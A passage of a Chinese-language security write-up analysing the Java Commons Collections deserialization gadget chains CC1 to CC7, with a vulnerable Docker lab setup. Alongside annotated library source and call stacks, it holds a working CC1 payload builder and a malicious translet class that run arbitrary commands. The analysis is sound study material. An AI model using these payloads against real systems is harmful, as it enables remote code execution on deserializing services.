JAVA_HOME /usr/local/jdk1.7.0_21ENV PATH $PATH:$JAVA_HOME/binENV JAVA_TOOL_OPTIONS -agentlib:jdwp=transport=dt_socket,address=10087,server=y,suspend=nCOPY deser-0.0.1-SNAPSHOT.jar /usr/src/deser.jarEXPOSE 10086CMD [\"java\", \"-Dserver.address=0.0.0.0\", \"-Dserver.port=10086\", \"-jar\", \"/usr/src/deser.jar\"] docker-compose.yml: 12345678910version : '2'services: server: build: context: . dockerfile: Dockerfile ports: - \"10086:10086\" - \"10087:10087\" 环境已上传：CC_docker_remote Transformer接口的各种实现（用作POP链的关键链结） 主要参考了CC链 1-7 分析对常用的链结的单独分析，可以很好地帮助理解。在这里根据该文记录一下自己的理解。 Transformer接口 Transformer接口是Commom Collection库中的一个很常用的接口，重点在于方便的“对象转化”，可以把Transformer接口的众多实现看作一系列的类处理器，能够对类进行各种不同的操作，将一种类转化为另一种类。这些实现的核心是定义了自己的 transform() 方法，其中包括返回某值、调用某个指定方法等。 参考：Interface Transformer ConstantTransformer类 “常量”转化器，顾名思义，每次都返回同一个“常量对象”，实现了一个每次都返回其初始值的转化类。具体而言，其初始化时对 this.iConstant 进行赋值，然后每次调用 transform() 时会返回 this.iConstant 。 InvokerTransformer类 “方法调用”转化器，顾名思义，调用 transform() 时会调用初始化时赋值的一种方法（通过对 this.iMethodName 反射得到）对其要处理的对象进行处理。 1234567891011121314151617181920212223public class InvokerTransformer implements Transformer, Serializable &#123; ... private final String iMethodName; private final Class[] iParamTypes; private final Object[] iArgs; //构造函数 public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123; this.iMethodName = methodName; this.iParamTypes = paramTypes; this.iArgs = args; &#125; //重写的 transform 方法，反射调用指定的方法并返回方法调用结果 public Object transform(Object input) &#123; ... Class cls = input.getClass(); Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); ... &#125; &#125;&#125; InstantiateTransformer类 “实例化”转化器，顾名思义，反射调用构造函数以将对应的类实例化。 1234567891011121314151617public class InstantiateTransformer implements Transformer, Serializable &#123; ... public static final Transformer NO_ARG_INSTANCE = new InstantiateTransformer(); private final Class[] iParamTypes; private final Object[] iArgs; //构造函数 public InstantiateTransformer(Class[] paramTypes, Object[] args) &#123; this.iParamTypes = paramTypes; this.iArgs = args; &#125; //重写的 transform 方法，反射调用构造函数将类实例化。 public Object transform(Object input) &#123; Constructor con = ((Class)input).getConstructor(this.iParamTypes); return con.newInstance(this.iArgs); &#125; ChainedTransformer类 “链式处理”转化器，顾名思义，使用该类时，我们可以初始化一个 Transformer[] 数组，调用 transform() 时会依次运用这个数组中的转化器。 1234567891011121314151617public class ChainedTransformer implements Transformer, Serializable &#123; ... private final Transformer[] iTransformers; //构造函数 public ChainedTransformer(Transformer[] transformers) &#123; this.iTransformers = transformers; &#125; //重写的 transform 方法，链式调用 Transformer[] 中每个 Transformer 的 transform 方法 public Object transform(Object object) &#123; for(int i = 0; i &lt; this.iTransformers.length; ++i) &#123; object = this.iTransformers[i].transform(object); &#125; return object; &#125;&#125; 在构造系统命令执行的操作中，一般使用该类对一系列的对象获取过程进行实现： 1234567891011121314151617public class Test &#123; public static void main(String[] args) &#123; //Transformer数组 Transformer[] transformers = new Transformer[] &#123; //对照一下：Runtime.getRuntime().exec('calc')，注意过程中的反射机制 //由于第一个链是常量转化器，所以transform传什么参数都一样 new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;\"getRuntime\", new Class[0]&#125;), new InvokerTransformer(\"invoke\", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;), new InvokerTransformer(\"exec\", new Class[]&#123;String.class&#125;, new Object[]&#123;\"calc\"&#125;) &#125;; //ChainedTransformer实例 Transformer chainedTransformer = new ChainedTransformer(transformers); chainedTransformer.transform(\"test123\"); &#125;&#125; 以上这些类是直接用来执行恶意指令的，但核心是需要触发任意类的 transform() 方法，各个CC链使用了不同的方法从 readObject() 到执行任意类的 transform() 。 CC1 我们详细分析CC1的利用过程，在CC2-7中是类似的，类比即可 环境要求：CC 3.1-3.2.1, jdk &lt; u71 Proxy类 在分析具体的链之前，我们先学习一下Java的动态代理，其关键类是 java.lang.reflect.Proxy 什么是代理？代理对象 = 增强代码（附加的操作） + 目标对象（原对象）。有了代理对象后，就不使用原对象了（用代理对象来代替原对象，进行一些额外操作） 什么情况使用代理？例：当我们需要对原对象进行日志记录时（类似于python的装饰器，在调用该对象前做某些操作） 如何实现静态代理？需要对原来的类实现一个一模一样的代理类，并在其基础上加入代理的额外操作。这样很麻烦 如何简化这个过程？使用动态代理 动态代理原理是什么？怎么使用？动态代理时，java通过现有的类动态创建一个新的类，并在其基础上添加一些额外操作，并且这个过程仅需要一行代码： 12345678910111213141516171819202122// 如何创建动态代理：Object proxy = Proxy.newProxyInstance( /*类加载器*/ target.getClass().getClassLoader(), /*让代理对象和目标对象实现相同接口*/ target.getClass().getInterfaces(), /*代理对象的方法最终都会被JVM导向它的invoke方法*/ new InvocationHandler()&#123; public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; System.out.println(method.getName() + \"方法开始执行...\"); Object result = method.invoke(target, args); System.out.println(result); System.out.println(method.getName() + \"方法执行结束...\"); return result; &#125; &#125;);proxy.xxx(); //用proxy代替原target对象 每次调用代理对象的任意方法，最终都会调用 InvocationHandler 的 invoke() 方法。通过类似hook的方式，对原对象的每个成员方法都进行hook。 参考：Java 动态代理作用是什么？ - bravo1988的回答 - 知乎 AnnotationInvocationHandler类 从头开始分析，CC1的入口是AnnotationInvocationHandler类(sun.reflect.annotation.AnnotationInvocationHandler)的readObject()，其中执行了this.memberValues.entrySet()，调用了this.memberValues的成员方法。所以我们可以将其设置为动态代理。然后我们再构造另一个AnnotationInvocationHandler，并设置为代理的InvocationHandler，进而调用该InvocationHandler的invoke()方法 然后，CC1链通过是AnnotationInvocationHandler的invoke()方法触发LazyMap的get方法。其关键代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344class AnnotationInvocationHandler implements InvocationHandler, Serializable &#123; private final Class&lt;? extends Annotation&gt; type; private final Map&lt;String, Object&gt; memberValues; //构造函数，可传入 LazyMap AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123; this.type = var1; this.memberValues = var2; &#125; //利用 invoke 方法可实现调用 LazyMap#get public Object invoke(Object var1, Method var2, Object[] var3) &#123; Object var6 = this.memberValues.get(var4); //关键点 &#125; private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException &#123; var1.defaultReadObject(); AnnotationType var2 = null; try &#123; var2 = AnnotationType.getInstance(this.type); &#125; catch (IllegalArgumentException var9) &#123; throw new InvalidObjectException(\"Non-annotation type in annotation serial stream\"); &#125; Map var3 = var2.memberTypes(); //注意这里的entrySet()，属于成员方法调用，会触发动态代理对象的invoke()方法： Iterator var4 = this.memberValues.entrySet().iterator(); while(var4.hasNext()) &#123; Entry var5 = (Entry)var4.next(); String var6 = (String)var5.getKey(); Class var7 = (Class)var3.get(var6); if (var7 != null) &#123; Object var8 = var5.getValue(); if (!var7.isInstance(var8) &amp;&amp; !(var8 instanceof ExceptionProxy)) &#123; var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + \"[\" + var8 + \"]\")).setMember((Method)var2.members().get(var6))); &#125; &#125; &#125; &#125;&#125; 我们继续分析LazyMap类的 get() LazyMap类 LazyMap类（org.apache.commons.collections.map.LazyMap）的get方法中可以调用任意类的transform方法： 12345678910111213141516171819202122232425262728public class LazyMap extends AbstractMapDecorator implements Map, Serializable &#123; ... protected final Transformer factory; //可控制 factory 为 ChainedTransformer public static Map decorate(Map map, Transformer factory) &#123; return new LazyMap(map, factory); &#125; protected LazyMap(Map map, Transformer factory) &#123; super(map); if (factory == null) &#123; throw new IllegalArgumentException(\"Factory must not be null\"); &#125; else &#123; this.factory = factory; &#125; &#125; public Object get(Object key) &#123; if (!super.map.containsKey(key)) &#123; //这里存在调用 Object value = this.factory.transform(key); super.map.put(key, value); return value; &#125; ... &#125;&#125; 自此，我们便能触发各种transformer链，执行恶意命令。调用栈大概为： 123456AnnotationInvocationHandler.readObject() //第一层AnnotationInvocationHandler -&gt;mapProxy.entrySet().iterator() // Proxy触发 invoke() -&gt;AnnotationInvocationHandler.invoke()//第二层AnnotationInvocationHandler -&gt;LazyMap.get() -&gt;ChainedTransformer.transform() ... 其中还包含一些其他的细节，通过代码和注释的形式来说明： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061public class TestCC &#123; /* * AnnotationInvocationHandler-&gt;readObject (用Proxy代替的) * AnnotationInvocationHandler-&gt;invoke (Proxy触发handler的invoke) * LazyMap-&gt;get * xxx-&gt;transform * 使用transformer构造一个恶意payload Runtime.getRuntime().exec(''); * */ public static Object getObject(String cmd) throws Exception &#123; // 因为InvokerTransformer的参数必须输入数组，所以这里强行构造一个数组 String[] execArgs = new String[]&#123;cmd&#125;; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), // 直接获取Runtime类 new InvokerTransformer(\"getMethod\", new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;\"getRuntime\", new Class[0]&#125;), new InvokerTransformer(\"invoke\", new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, new Object[0]&#125;), new InvokerTransformer(\"exec\", new Class[]&#123;String.class&#125;, execArgs), &#125;; //先实例化一个空的transformer，防止在反序列化之前就执行命令 ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]&#123;new ConstantTransformer(1)&#125;);// ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); //AnnotationInvocationHandler类是非public类，只能通过反射得到，并且类型只能用Class&lt;?&gt; Class tmp_annotationInvocationHandler = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); //获取AnnotationInvocationHandler的构造函数并设置为可见（取消protected） //此外，由于该类不是public的，所以这里不能直接用该类进行newInstance，而是需要获取其声明构造函数以得到对象 Constructor constructor = tmp_annotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); //LazyMap的构造函数是protected，不能直接调用，可以通过decorate间接调用： //public static Map decorate(Map map, Transformer factory) &#123; // return new LazyMap(map, factory); // &#125; Map testMap = new HashMap();//这里的decorate方法必须要随便一个Map对象，所以选择初始化一个HashMap Map lazyMap = LazyMap.decorate(testMap, chainedTransformer); //使用AnnotationInvocationHandler构造函数得到实例 //第一个参数必须为Class&lt;? extends Annotation&gt;，所以这里选择Retention.class（其他满足条件的也可以 InvocationHandler annotationInvocationHandler = (InvocationHandler) constructor.newInstance(Retention.class, lazyMap); //获取一个代理，用来代理Map类的对象，其第三个参数（handler）为AnnotationInvocationHandler对象，以触发其invoke方法 //注意这里内部的transformer是空的，如果此时已包含恶意payload，并且debug模式打了断点，则会触发，并且在反序列化时不会触发 Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]&#123;Map.class&#125;, annotationInvocationHandler); InvocationHandler res = (InvocationHandler) constructor.newInstance(Retention.class, proxyMap); //防止在反序列化之前就执行命令，在这里才通过反射对真正的恶意transformer链进行赋值 Class chainClass = chainedTransformer.getClass(); Field iTransformers = chainClass.getDeclaredField(\"iTransformers\"); iTransformers.setAccessible(true); iTransformers.set(chainedTransformer, transformers); return res; &#125;&#125; 需要注意的是其中首先获取的是一个“空”的ChainedTransformer，以避免在payload生成阶段就执行恶意命令，导致利用失败。这里很奇怪，试了不用1占位，开了debug并且打断点才触发，跟toString也没有关系，是在proxy建立那一步完成时，debugger获取信息的时候触发的，断点都不会停。经过和多个师傅的交流测试，发现很玄学，我自己的环境不行，其他师傅的可以，并且跟版本似乎没啥关系，不管它了。 此外，本链的入口有两个InvocationHandler通过动态代理嵌套，而不是只有一个InvocationHandler。 jdk 1.8 中的修复 jdk 1.8中的 sun.reflect.annotation.AnnotationInvocationHandler 的readObject方法中的关键步骤 Iterator var4 = this.memberValues.entrySet().iterator(); 变成了 LinkedHashMap var7 = new LinkedHashMap(); 导致不可控了，从而断掉了此链： 12345678private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException &#123; ... // 原本是this.memberValues.entrySet()，现在不可控了： LinkedHashMap var7 = new LinkedHashMap(); ... for(Iterator var8 = var4.entrySet().iterator(); var8.hasNext(); var7.put(var10, var11)) &#123; ... CC3 环境要求：CC 3.1-3.2.1, jdk &lt; 7u21 为什么要先看CC3而不是CC2呢，因为该链在CC1的基础上得到，在命令执行的Transformer阶段，去掉了InvokerTransformer的Serializable继承，导致无法序列化。所以将transformer链中的该对象替换为InstantiateTransformer、TrAXFilter、TemplatesImpl对象的组合 首先，从transform()方法的调用开始，通过InstantiateTransformer触发TrAXFilter的构造函数。然后继续分析如下： TrAXFilter类 TrAXFilter类（com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter）的构造函数中能够调用任意类的newTransformer方法： 12345678910public class TrAXFilter extends XMLFilterImpl &#123; //构造函数 public TrAXFilter(Templates templates) throws TransformerConfigurationException &#123; _templates = templates; _transformer = (TransformerImpl) templates.newTransformer();//关键点 ... &#125;&#125; TemplatesImpl类 TemplatesImpl类（com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl）的newTransformer方法会使用类加载器根据字节码(this._bytecodes)动态加载类，并将其实例化，所以可以利用该类动态加载获取任意的恶意类。由于是动态加载，如果能够调用该类的newTransformer方法，就可以加载攻击者自定义实现的恶意类（会调用该类的构造函数），从而执行任意命令。到此，该链分析完毕。 12345678910111213141516171819202122232425262728293031public final class TemplatesImpl implements Templates, Serializable &#123; private String _name = null; private byte[][] _bytecodes = null; private transient TransformerFactoryImpl _tfactory = null; //关键方法：newTransformer() public synchronized Transformer newTransformer() throws TransformerConfigurationException &#123; TransformerImpl transformer; // 关键点，调用 getTransletInstance() transformer = new TransformerImpl(getTransletInstance(), _outputProperties, _indentNumber, _tfactory); &#125; //跟进 getTransletInstance() 方法： private Translet getTransletInstance() throws TransformerConfigurationException &#123; try &#123; if (_name == null) return null; //先判断是否为 null，如果为 null 的话去加载字节码，然后调用newInstance()对其实例化。 if (_class == null) defineTransletClasses(); AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance(); ... &#125; &#125; ... 其中的恶意字节码类需要继承 AbstractTranslet ： 12345678910111213141516171819public class HelloTemplatesImpl extends AbstractTranslet &#123; public HelloTemplatesImpl() &#123; super(); try&#123; Runtime.getRuntime().exec(\"calc\"); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123; &#125; @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123; &#125;&#125; 这里的payload在字节码部分有多种写法，可以直接将恶意字节码硬写为base64，也可以通过javassist得到字节码。 调用栈大概为： 12345678910-&gt;AnnotationInvocationHandler.readObject() -&gt;mapProxy.entrySet().iterator() -&gt;AnnotationInvocationHandler.invoke() -&gt;LazyMap.get() -&gt;ChainedTransformer.transform() -&gt;ConstantTransformer.transform() -&gt;InstantiateTransformer.transform() -&gt;TrAXFilter.TrAXFilter() -&gt;TemplatesImpl.newTransformer() -&gt;触发恶意字节码中的操作（构造函数） CC2 引自CC链 1-7 分析： 利用条件比较苛刻：首先CommonsCollections3无法利用，因为其 TransformingComparator无法序列化。其次只有 CommonsCollections4-4.0 可以使用，因为 CommonsCollections4其他版本去掉了 InvokerTransformer 的Serializable继承，导致无法序列化。 该链选择PriorityQueue类的 readObject() 作为入口，下面开始分析 PriorityQueue类 1234567891011121314151617181920212223242526272829303132333435363738394041424344public class PriorityQueue&lt;E&gt; extends AbstractQueue&lt;E&gt; implements java.io.Serializable &#123; private transient Object[] queue; //关键点，可以传入 TemplatesImpl private final Comparator&lt;? super E&gt; comparator; //关键点可以反射设置我们自己的 Comparator //关键点，反序列化时字段执行的 readObject private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException &#123; //关键点，调用 heapify() 排序 heapify(); &#125; //跟进 heapify() 方法 private void heapify() &#123; for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--) siftDown(i, (E) queue[i]); &#125; //跟进 siftDown 方法，如果 comparator 不为空，调用 siftDownUsingComparator private void siftDown(int k, E x) &#123; if (comparator != null) siftDownUsingComparator(k, x); else siftDownComparable(k, x); &#125; //跟进 siftDownUsingComparator 方法，可以看到这里调用了自定义的Comparator的compare方法 private void siftDownUsingComparator(int k, E x) &#123; int half = size &gt;&gt;&gt; 1; while (k &lt; half) &#123; int child = (k &lt;&lt; 1) + 1; Object c = queue[child]; int right = child + 1; if (right &lt; size &amp;&amp; comparator.compare((E) c, (E) queue[right]) &gt; 0) //关键点 c = queue[child = right]; if (comparator.compare(x, (E) c) &lt;= 0) break; queue[k] = c; k = child; &#125; queue[k] = x; &#125;&#125; 可以很容易发现，从 readObject() 能够执行到 siftDownUsingComparator 并且调用自定义的Comparator的 compare() 方法 TransformingComparator类 该类的compare方法正好能够触发任意类的 transform() 方法，后面再接TemplatesImpl即可加载字节码，执行恶意指令： 12345678910111213141516public class TransformingComparator&lt;I, O&gt; implements Comparator&lt;I&gt;, Serializable &#123; ... private final Comparator&lt;O&gt; decorated; private final Transformer&lt;? super I, ? extends O&gt; transformer; public TransformingComparator(Transformer&lt;? super I, ? extends O&gt; transformer) &#123; this(transformer, ComparatorUtils.NATURAL_COMPARATOR); &#125; public int compare(I obj1, I obj2) &#123; //关键点 O value1 = this.transformer.transform(obj1); O value2 = this.transformer.transform(obj2); return this.decorated.compare(value1, value2); &#125;&#125; 调用栈： 1234567891011-&gt;PriorityQueue.readObject()-&gt;PriorityQueue.heapify()-&gt;PriorityQueue.siftDown()-&gt;PriorityQueue.siftDownUsingComparator() -&gt;TransformingComparator.compare() -&gt;InvokerTransformer.transform() // 注意这里，直接把要调用的方法设置为newTransformer，所以链变短了一些 -&gt;TemplatesImpl.newTransformer() -&gt;getTransletInstance() ... -&gt;defineClass、newInstance等sink -&gt;触发恶意字节码中的操作（构造函数） 有一个细节：在transformer调用阶段，直接通过 InvokerTransformer 调用了 TemplatesImpl.newTransformer ，链结长度会短一些。 CC4 环境要求：CC 4.0，jdk &lt; 7u21 与CC3的构造动机类似，该链在CC2的基础上，以PriorityQueue类的 readObject() 作为入口，将 InvokerTransformer 替换为InstantiateTransformer、TrAXFilter、TemplatesImpl对象的组合。 调用栈： 1234567891011121314-&gt;PriorityQueue.readObject()-&gt;PriorityQueue.heapify()-&gt;PriorityQueue.siftDown()-&gt;PriorityQueue.siftDownUsingComparator() -&gt;TransformingComparator.compare() -&gt;ChainedTransformer.transform() -&gt;ConstantTransformer.transform() -&gt;InstantiateTransformer.transform() -&gt;TrAXFilter.TrAXFilter()//构造函数中会调用templates.newTransformer() -&gt;TemplatesImpl.newTransformer() -&gt;getTransletInstance() ... -&gt;defineClass、newInstance等sink -&gt;触发恶意字节码中的操作（构造函数） CC5 环境要求：CC 3.1-3.2.1，jdk 1.8 该链在CC1的基础上，更改了触发入口，将 AnnotationInvocationHandler 的 readObject() 触发点改为BadAttributeValueExpException类的 readObject() BadAttributeValueExpException类 该类的readObject方法中，会调用 valObj.toString(); ，并且valObj可控，即可以调用任意对象的 toString() 方法，这个过程和一些PHP的POP链入口很相似。 12345678910111213141516171819202122232425public class BadAttributeValueExpException extends Exception &#123; private Object val; //这里可以控制 val 为 TiedMapEntry private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123; ObjectInputStream.GetField gf = ois.readFields(); Object valObj = gf.get(\"val\", null); if (valObj == null) &#123; val = null; &#125; else if (valObj instanceof String) &#123; val= valObj; &#125; else if (System.getSecurityManager() == null || valObj instanceof Long || valObj instanceof Integer || valObj instanceof Float || valObj instanceof Double || valObj instanceof Byte || valObj instanceof Short || valObj instanceof Boolean) &#123; val = valObj.toString(); //这里是关键点，调用toString() &#125; else &#123; val = System.identityHashCode(valObj) + \"@\" + valObj.getClass().getName(); &#125; &#125;&#125; TiedMapEntry类 TiedMapEntry类中可以有如下执行路径： toString -&gt; getValue -&gt; this.map.get(this.key) ，从而可以触发LazyMap的 get ： 1234567891011121314151617181920212223public class TiedMapEntry implements Entry, KeyValue, Serializable &#123; private static final long serialVersionUID = -8453869361373831205L; private final Map map; private final Object key; //构造函数，显然我们可以控制 this.map 为 LazyMap public TiedMapEntry(Map map, Object key) &#123; this.map = map; this.key = key; &#125; //toString函数，注意这里调用了 getValue() public String toString() &#123; return this.getKey() + \"=\" + this.getValue(); &#125; //跟进 getValue(), 这是关键点 this.map.get() 触发 LazyMap.get() public Object getValue() &#123; return this.map.get(this.key); &#125;&#125; 调用栈： 12345678-&gt;BadAttributeValueExpException.readObject() -&gt;TiedMapEntry.toString() -&gt;TiedMapEntry.getValue() -&gt;LazyMap.get() -&gt;ChainedTransformer.transform() -&gt;ConstantTransformer.transform() -&gt;InvokerTransformer.transform() ... //与CC1相同，获取getMethod 、invoke 、exec 在java 7中，BadAttributeValueExpException并没有实现readObject方法，并且toString方法也不满足条件，所以该链无法使用： 12345678910111213public class BadAttributeValueExpException extends Exception &#123; private static final long serialVersionUID = -3105272988410493376L; private Object val; public BadAttributeValueExpException (Object val) &#123; this.val = val; &#125; public String toString() &#123; return \"BadAttributeValueException: \" + val; &#125; &#125; idea调试的坑 在调试CC5时，由于IDEA会隐式调用对象的 toString() ，导致在payload生成阶段就会触发，并且使产生的序列化数据出错，导致反序列化时触发payload失败。 关于IDEA在debug时私自调用toString()方法的问题 CC6 环境要求：CC 3.1-3.2.1，jdk 1.7, 1.8 该链采用HashMap的 reaObject() 作为入口，经过 putForCreate -&gt; hash(key) -&gt; k.hashCode() 以触发TiedMapEntry类的 hashCode() HashMap类 1234567891011121314151617181920212223242526public class HashMap&lt;K,V&gt; extends AbstractMap&lt;K,V&gt; implements Map&lt;K,V&gt;, Cloneable, Serializable &#123; private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException &#123; ... for (int i = 0; i &lt; mappings; i++) &#123; K key = (K) s.readObject(); V value = (V) s.readObject(); putForCreate(key, value);//关键点 &#125; &#125; private void putForCreate(K key, V value) &#123; int hash = null == key ? 0 : hash(key); //关键点，key可控，赋值为TiedMapEntry int i = indexFor(hash, table.length); ... createEntry(hash, key, value, i); &#125; final int hash(Object k) &#123; int h = hashSeed; if (0 != h &amp;&amp; k instanceof String) &#123; return sun.misc.Hashing.stringHash32((String) k); &#125; h ^= k.hashCode(); //关键点，触发 TiedMapEntry.hashCode() ... &#125; TiedMapEntry类 该类的hashCode存在执行路径： this.getValue() -&gt; this.map.get(this.key) 从而触发LazyMap的 get 方法。 1234567891011121314151617181920public class TiedMapEntry implements Entry, KeyValue, Serializable &#123; ... private final Map map; private final Object key; public TiedMapEntry(Map map, Object key) &#123; this.map = map; this.key = key; &#125; public int hashCode() &#123; Object value = this.getValue();//关键点 return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode()); &#125; public Object getValue() &#123; return this.map.get(this.key); // 可以调用LazyMap的get &#125;&#125; 调用栈： 12345678910-&gt;HashMap.readObject() -&gt;HashMap.putForCreate() -&gt;HashMap.hash() -&gt;TiedMapEntry.hashCode() -&gt;TiedMapEntry.getValue() -&gt;LazyMap.get() -&gt;ChainedTransformer.transform() -&gt;ConstantTransformer.transform() -&gt;InvokerTransformer.transform() -&gt;...//Runtime、getRuntime、exec... 需要注意的是，在payload构造代码中，会执行 res.put(tiedMapEntry, &quot;something&quot;); ，这里需要先对chainedTransformer用1占位，以免 put 会提前触发payload，并且导致报错出现，序列化对象出错，反序列化不会触发恶意payload。 CC7 环境要求：CC 3.1-3.2.1，jdk 1.7, 1.8 虽然与之前的一些链一样用到了LazyMap，但前面的链都是生硬地直接去调用LazyMap的get方法，而CC7链的核心思想在于真正利用LazyMap这个装饰类能够调用用户自定义的factory对象的transform方法（与该类的设计思想一致），该链以Hashtable的readObject为入口。这个链在构造时有很多细节，涉及到装饰器模式、多个类的继承和接口的实现，以及hash碰撞等细节。 Hashtable类 Hashtable的readObject存在 reconstitutionPut(table, key, value) -&gt; e.key.equals(key) 的执行路径（其中，e可控，类型为 Hashtable.Entry&lt;K, V&gt;[] ），该方法用来在反序列化时还原HashTable中各个元素的值： 12345678910111213141516171819202122232425262728293031323334public class Hashtable&lt;K,V&gt; extends Dictionary&lt;K,V&gt; implements Map&lt;K,V&gt;, Cloneable, java.io.Serializable &#123; ... private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException &#123; ... //初始化Entry列表，该列表会在反序列化过程中慢慢还原 Entry&lt;K,V&gt;[] table = new Entry[length]; ... for (; elements &gt; 0; elements--) &#123; K key = (K)s.readObject(); V value = (V)s.readObject(); reconstitutionPut(table, key, value); // 关键点 &#125; this.table = table; &#125; ... private void reconstitutionPut(Entry&lt;K,V&gt;[] tab, K key, V value) throws StreamCorruptedException &#123; ... for (Entry&lt;K,V&gt; e = tab[index] ; e != null ; e = e.next) &#123; if ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;// 关键点，e可控 e.key.equals throw new java.io.StreamCorruptedException(); &#125; &#125; ... &#125;&#125; LazyMap类进一步理解以及HashMap 在这里，我们用到用LazyMap来装饰的HashMap对象。 虽然前面的CC1用到了该类，但对CC1的理解并不需要熟悉LazyMap的具体作用，而CC7则需要对其进行熟悉。LazyMap类实际上是一个用来装饰其他Map（比如HashMap）的装饰器，当调用LazyMap的get方法时，会去调用其修饰的Map的对应get方法（在原来的get基础上附加调用用户规定的 this.factory 中的 transform() ），LazyMap的作用就是在被装饰者不包含某键名的Entry时调用工厂类去产生一个Entry： 12345678910111213public class LazyMap extends AbstractMapDecorator implements Map, Serializable &#123; ... public Object get(Object key) &#123; // create value for key if key is not currently in the map if (map.containsKey(key) == false) &#123; // 附加操作 Object value = factory.transform(key); map.put(key, value); return value; &#125; return map.get(key); &#125;&#125; 并且，该类继承了 AbstractMapDecorator 抽象类，类似地， AbstractMapDecorator 类的 equals() ，同样起到装饰器作用，会调用被装饰者的 equals() ： 12345678910public abstract class AbstractMapDecorator implements Map &#123; ... public boolean equals(Object object) &#123; if (object == this) &#123; return true; &#125; return map.equals(object); &#125;&#125; 我们回到上一步分析的链，现在到了 e.key.equals(key) ，这里其实是在尝试检查现在要加入的Entry的key值是不是真的和列表中已有的Entry的key是完全一样的（前面一步是计算它们的hash，并且hash是一样的）。此处会调用LazyMap的 equals 方法，也就是会调用其装饰的HashMap的 equals 方法。然后HashMap继承了 AbstractMap 类，所以调用的实际上是 AbstractMap#equals() ： 1234567891011121314151617181920212223public abstract class AbstractMap&lt;K,V&gt; implements Map&lt;K,V&gt; &#123; public boolean equals(Object o) &#123; ... Map&lt;K,V&gt; m = (Map&lt;K,V&gt;) o; ... try &#123; Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator(); while (i.hasNext()) &#123; Entry&lt;K,V&gt; e = i.next(); K key = e.getKey(); V value = e.getValue(); if (value == null) &#123; if (!(m.get(key)==null &amp;&amp; m.containsKey(key))) return false; &#125; else &#123; if (!value.equals(m.get(key))) // 关键点，调用LazyMap的get方法 return false; &#125; &#125; ... ... &#125;&#125; 这里便会调用LazyMap的get方法，然后就回到了之前的CC命令执行的阶段，大致调用栈： 123456789-&gt;Hashtable.readObject()-&gt;Hashtable.reconstitutionPut() -&gt;AbstractMapDecorator.equals -&gt;AbstractMap.equals() -&gt;LazyMap.get.get() -&gt;ChainedTransformer.transform() -&gt;ConstantTransformer.transform() -&gt;InvokerTransformer.transform() -&gt;...//Runtime、getRuntime、exec... 一些细节 1. payload构造时为什么要用两个LazyMap？ 在 java\\util\\Hashtable.java#reconstitutionPut 中，实际上是实现了在调用反序列化时对Hashtable中的一个Entry进行还原的操作，其中，关键语句 e.key.equals(key) 是在对现在还原的部分与要添加的新键值对元素的查重操作中发生的（在反序列化的时候，不应该出现重复的元素，否则报错），所以如果table中只有一个元素，就不会进行查重操作，无法触发payload： 123456789101112131415161718private void reconstitutionPut(Entry&lt;K,V&gt;[] tab, K key, V value) throws StreamCorruptedException &#123; ... // Makes sure the key is not already in the hashtable. // This should not happen in deserialized version. int hash = hash(key); int index = (hash &amp; 0x7FFFFFFF) % tab.length; for (Entry&lt;K,V&gt; e = tab[index] ; e != null ; e = e.next) &#123; if ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123; throw new java.io.StreamCorruptedException(); &#125; &#125; // Creates the new entry. Entry&lt;K,V&gt; e = tab[index]; tab[index] = new Entry&lt;&gt;(hash, key, value, e); count++; &#125; 2. 为什么要删除LazyMap2中key为yy的元素？ 直观来看： hashtable.put(lazyMap2, &quot;test&quot;); 会使得lazyMap2增加一个多余的 yy=&gt;yy 键值对，需要删除掉。如果不删掉，待加入的Entry的size就和已有的Entry的size不同，从而使执行流程提前终止，无法触发恶意流程。下面我们来详细看一下怎么回事： 为什么会增加一个多余的 yy=&gt;yy 键值对？ 在 AbstractMap#equals() 中，会获取HashTable的key，并调用 m.get(key) ，即调用LazyMap装饰器的 get() 方法： 1234567891011121314151617public abstract class AbstractMap&lt;K,V&gt; implements Map&lt;K,V&gt; &#123; public boolean equals(Object o) &#123; ... try &#123; Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator(); while (i.hasNext()) &#123; Entry&lt;K,V&gt; e = i.next(); K key = e.getKey();//这里会获取HashTable的key，也就是yy V value = e.getValue(); if (value == null) &#123; if (!(m.get(key)==null &amp;&amp; m.containsKey(key))) return false; &#125; else &#123; if (!value.equals(m.get(key))) return false; &#125; &#125; 